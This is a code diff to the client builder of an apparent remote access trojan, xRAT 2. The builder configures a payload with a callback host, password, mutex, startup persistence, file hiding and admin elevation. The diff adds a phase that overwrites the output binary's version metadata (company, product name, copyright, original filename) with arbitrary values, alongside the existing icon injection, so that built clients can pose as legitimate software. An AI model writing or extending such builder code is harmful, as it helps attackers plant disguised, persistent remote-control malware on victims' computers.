@@ -3,13 +3,14 @@ using Mono.Cecil;
 using Mono.Cecil.Cil;
 using System;
 using System.Windows.Forms;
+using Vestris.ResourceLib;
 using xRAT_2.Settings;
 
 namespace Core.Build
 {
     class ClientBuilder
     {
-        public static void Build(string output, string host, string password, string installsub, string installname, string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay, int installpath, bool adminelevation, string iconpath)
+        public static void Build(string output, string host, string password, string installsub, string installname, string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay, int installpath, bool adminelevation, string iconpath, string[] asminfo)
         {
             // PHASE 1 - Settings
             string encKey = Helper.GetRandomName(20);
@@ -32,7 +33,7 @@ namespace Core.Build
                                     switch (strings)
                                     {
                                         case 1: //version
-                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(Application.ProductVersion + " " + XMLSettings.VERSION, encKey);
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(Application.ProductVersion, encKey);
                                             break;
                                         case 2: //ip/hostname
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(host, encKey);
@@ -108,7 +109,32 @@ namespace Core.Build
             // PHASE 3 - Saving
             r.AsmDef.Write(output);
 
-            // PHASE 4 - Icon changing
+            // PHASE 4 - Assembly Information changing
+            if (asminfo != null)
+            {
+                VersionResource versionResource = new VersionResource();
+                versionResource.LoadFrom(output);
+
+                versionResource.FileVersion = asminfo[7];
+                versionResource.ProductVersion = asminfo[6];
+                versionResource.Language = 0;
+
+                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
+                stringFileInfo["CompanyName"] = asminfo[2];
+                stringFileInfo["FileDescription"] = asminfo[1];
+                stringFileInfo["ProductName"] = asminfo[0];
+                stringFileInfo["LegalCopyright"] = asminfo[3];
+                stringFileInfo["LegalTrademarks"] = asminfo[4];
+                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
+                stringFileInfo["FileVersion"] = versionResource.FileVersion;
+                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
+                stringFileInfo["InternalName"] = asminfo[5];
+                stringFileInfo["OriginalFilename"] = asminfo[5];
+
+                versionResource.SaveTo(output);
+            }
+
+            // PHASE 5 - Icon changing
             if (!string.IsNullOrEmpty(iconpath))
                 IconInjector.InjectIcon(output, iconpath);
         }
